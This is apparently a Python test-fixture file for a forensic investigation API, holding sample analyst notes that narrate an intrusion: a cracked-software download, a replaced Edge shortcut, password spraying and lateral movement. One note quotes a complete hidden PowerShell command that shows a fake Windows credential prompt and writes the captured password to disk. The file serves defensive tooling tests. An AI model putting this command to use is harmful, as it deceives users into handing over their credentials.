"""
test values for the API
"""

TEST_OPERATION_ID = "test_operation"
TEST_CONTEXT_NAME = "test_context"
TEST_CONTEXT_ID = "66d98ed55d92b6b7382ffc77df70eda37a6efaa1"  # test_context
TEST_SOURCE_NAME = "test_source"
TEST_SOURCE_ID_2 = "fa144510fd16cf5ffbaeec79d68b593f3ba7e7e0"  # name=test_source
TEST_SOURCE_ID = (
    "fabae8858452af6c2acde7f90786b3de3a928289"  # name=security_big_sample.evtx
)
TEST_INDEX = TEST_OPERATION_ID
TEST_REQ_ID = "test_req"
TEST_WS_ID = "test_ws"
TEST_HOST = "http://localhost:8080"
TEST_HOST_HTTPS = "https://localhost:8080"

TEST_NOTES_AI = [
    {
        "notes": [{"tags": [], "text": "User searches for illicit software"}],
        "@timestamp": "2025-05-16T18:17:30.762000+00:00",
    },
    {
        "notes": [
            {"tags": [], "text": "Reddit post containing link to malicious website"}
        ],
        "@timestamp": "2025-05-16T18:24:11.334000+00:00",
    },
    {
        "notes": [{"tags": [], "text": "User lands on malicious website"}],
        "@timestamp": "2025-05-16T18:24:52.133000+00:00",
    },
    {
        "notes": [{"tags": [], "text": "User downloads suspicious file"}],
        "@timestamp": "2025-05-16T18:24:57.899000+00:00",
    },
    {
        "notes": [{"tags": [], "text": "user keep searching for cracked software"}],
        "@timestamp": "2025-05-16T18:31:34.435000+00:00",
    },
    {
        "notes": [
            {
                "tags": [],
                "text": "Reddit post containing download links to cracked software",
            }
        ],
        "@timestamp": "2025-05-16T18:31:44.688000+00:00",
    },
    {
        "notes": [{"tags": [], "text": "User lands on suspicious landing page"}],
        "@timestamp": "2025-05-16T18:31:48.649000+00:00",
    },
    {
        "notes": [{"tags": [], "text": "Download of Spotify_Unloked.exe "}],
        "@timestamp": "2025-05-16T18:31:59.815000+00:00",
    },
    {
        "notes": [{"tags": [], "text": "FileCreateStreamHash Spotify_Unlocked.exe"}],
        "@timestamp": "2025-05-16T18:32:07.718661+00:00",
    },
    {
        "notes": [
            {"tags": [], "text": "Process creation, Spotify_Unlocked.exe executed"}
        ],
        "@timestamp": "2025-05-16T18:32:17.271551+00:00",
    },
    {
        "notes": [
            {
                "tags": [],
                "text": ".lnk replaced with malicious payload to steal credentials",
            }
        ],
        "@timestamp": "2025-05-17T16:58:20.148248+00:00",
    },
    {
        "notes": [
            {
                "tags": [],
                "text": "First success right after failed attempts (probably compromised)",
            }
        ],
        "@timestamp": "2025-05-18T14:52:30.875868+00:00",
    },
    {
        "notes": [
            {"tags": [], "text": "credentials saved to mpdata.bin"},
            {
                "tags": [],
                "text": "process.command_line: \"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"& {$c=$Host.UI.PromptForCredential('Windows Security','Edge requires your credentials to access saved passwords','',''); $u=$c.UserName;$pw=[System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($c.Password));[System.IO.File]::WriteAllText('C:\\Users\\J4D10~1.MEL\\AppData\\Local\\Temp\\L007-1-3-37000000',$u+':'+$pw);Start-Process                    -FilePath 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe' -ArgumentList '' -WorkingDirectory 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application';Start-Sleep -s 2; Copy-Item -Path 'C:\\Users\\j.melnitz\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\mpdata.bin' -Destination 'C:\\Users\\j.melnitz\\Desktop\\Microsoft Edge.lnk' -Force;Remove-Item -Path 'C:\\Users\\j.melnitz\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\mpdata.bin' -Force}",
            },
        ],
        "@timestamp": "2025-05-17T17:06:26.517291+00:00",
    },
    {
        "notes": [
            {
                "tags": [],
                "text": "first of many failed login attempts (password spraying)",
            }
        ],
        "source": "Security.evtx",
        "context": "DC",
        "@timestamp": "2025-05-18T14:52:29.882043+00:00",
    },
    {
        "notes": [
            {"tags": [], "text": "compromised user accessed BASEMENTRESEARCH1 machine"}
        ],
        "@timestamp": "2025-05-18T15:01:58.674704+00:00",
    },
    {
        "notes": [
            {
                "tags": ["ta0109"],
                "text": "local login (not recognized by client, possible compromise)",
            }
        ],
        "@timestamp": "2025-05-18T21:33:24.789228+00:00",
    },
]

TEST_LINKS_AI = [
    {
        "_id": "b9c281d7d7edd9a614d39cd1862a63cb",
        "links": [
            {
                "name": "executed",
                "doc_ids": [
                    "b9c281d7d7edd9a614d39cd1862a63cb",
                    "113874ad55c9dfd3370702fa6934077a",
                ],
            }
        ],
    },
    {
        "_id": "c203f66bc7d630097b01fca4602eaa85",
        "links": [
            {"name": "attempted login", "doc_ids": ["c203f66bc7d630097b01fca4602eaa85"]}
        ],
    },
    {
        "_id": "22e752ca158409bc5a8715c4916f419f",
        "links": [
            {
                "id": "f65cbb57-f901-4ae0-bc14-ddd39afe822c",
                "name": "to DESKTOP-1TN1",
                "tags": [],
                "color": "#c99900",
                "doc_ids": [
                    "22e752ca158409bc5a8715c4916f419f",
                    "43b439361bb5f9378ea5b8b1f9c7f821",
                ],
                "glyph_id": "a-arrow-down",
            }
        ],
    },
]

TEST_IDS_AI = [
    "5688ba1ab685f693f1bbfbdc5d9f808c",
    "ba3e2ed22f87676b57c49a24936d298a",
    "219d400289e8b5432900b1a2f1f792eb",
    "85caefde516389f6dbfc99325f689265",
    "f70427835346db5805a1a69164ea8291",
    "36acc97c48a2b47deec482c23f644e6c",
    "2c13cb796cdea706df84d7d535d055d7",
    "b9c281d7d7edd9a614d39cd1862a63cb",
    "ee8d1027308739c602a8ca3e5a3f602b",
    "113874ad55c9dfd3370702fa6934077a",
    "c203f66bc7d630097b01fca4602eaa85",
    "c482e11336763875ff8a1ea45ae6a492",
    "25dae492a826d03d43cfe53bfa1278df",
    "a0455d3c6746e86ad9a6e60af15e9da0",
    "43b439361bb5f9378ea5b8b1f9c7f821",
    "22e752ca158409bc5a8715c4916f419f",
]
